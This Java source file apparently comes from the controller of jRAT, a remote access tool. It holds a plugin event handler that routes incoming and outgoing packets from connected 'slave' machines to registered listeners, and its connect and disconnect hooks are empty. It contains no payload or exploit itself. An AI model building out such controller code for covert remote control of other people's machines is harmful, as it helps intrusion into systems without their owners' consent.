package io.jrat.controller.addons;

import io.jrat.controller.AbstractSlave;
import jrat.api.Client;
import jrat.api.events.Event;
import jrat.api.events.EventType;
import jrat.api.events.OnConnectEvent;
import jrat.api.events.OnDisconnectEvent;
import jrat.api.net.Packet;
import jrat.api.net.PacketListener;

public class PluginEventHandler {

	public static void onPacket(AbstractSlave slave, short header) {				
		Client client = ClientFormat.format(slave);
		
		for (PacketListener l : Packet.getIncoming(header)) {
			l.perform(client);
		}
	}

	public static void onConnect(AbstractSlave slave) {

	}

	public static void onDisconnect(AbstractSlave slave) {

	}

	public static void onSendPacket(short id, AbstractSlave slave) {
		Client client = ClientFormat.format(slave);
		
		for (PacketListener l : Packet.getOutgoing(id)) {
			l.perform(client);
		}
	}

}
